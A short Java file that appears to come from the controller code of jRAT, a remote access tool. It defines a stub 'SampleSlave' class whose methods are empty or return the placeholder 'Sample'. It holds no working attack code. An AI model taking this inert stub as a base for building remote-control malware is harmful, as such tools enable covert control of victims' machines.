package jrat.controller;

import java.io.File;
import oslib.AbstractOperatingSystem;

public class SampleSlave extends AbstractSlave {

	public SampleSlave(AbstractOperatingSystem os) {
		super(null, null);
		super.os = os;
	}

	@Override
	public void run() {
		
	}

	@Override
	public void ping() throws Exception {
		
	}

	@Override
	public String getHostname() {
		return "Sample";
	}

	@Override
	public String getUsername() {
		return "Sample";
	}

	@Override
	public String getFileSeparator() {
		return File.separator;
	}

}
